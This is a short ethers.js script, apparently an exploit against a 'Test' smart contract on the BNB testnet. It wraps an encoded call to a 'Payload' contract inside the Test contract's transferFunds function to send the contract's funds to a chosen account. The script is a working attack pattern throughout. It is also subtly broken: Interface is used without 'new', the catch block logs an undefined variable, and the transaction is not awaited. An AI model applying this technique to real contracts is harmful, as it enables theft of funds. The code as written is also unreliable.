const { ethers } = require('ethers');
const Payload = require('./artifacts/contracts/payload.sol/Payload.json');
const Test = require('./artifacts/contracts/test.sol/Test.json');

const testnetRPC = 'https://data-seed-prebsc-1-s1.bnbchain.org:8545/';

const TestContractAddr = "0x472F952956B6C7444D917c1c46d9b2fC35bbE9cE";
const PayloadContractAddr = "0x6E0df6d426348523705E50141eA8A596e9B8F536";

const accountAddr = "0x9d704112Efde411da98C2DF72423248f7C37e963";
const privKey = "";

const provider = new ethers.JsonRpcProvider(testnetRPC);
const wallet = new ethers.Wallet(privKey, provider);

let encodedPayload = ethers.Interface(Payload.abi).encodeFunctionData("transferFunds", [accountAddr]);
let encodedData = ethers.Interface(Test.abi).encodeFunctionData('transferFunds', [PayloadContractAddr, encodedPayload]);

const tx = {
    to: TestContractAddr,
    data: encodedData,
};

try {
    wallet.sendTransaction(tx);
} catch (error) {
    console.log(err)
}
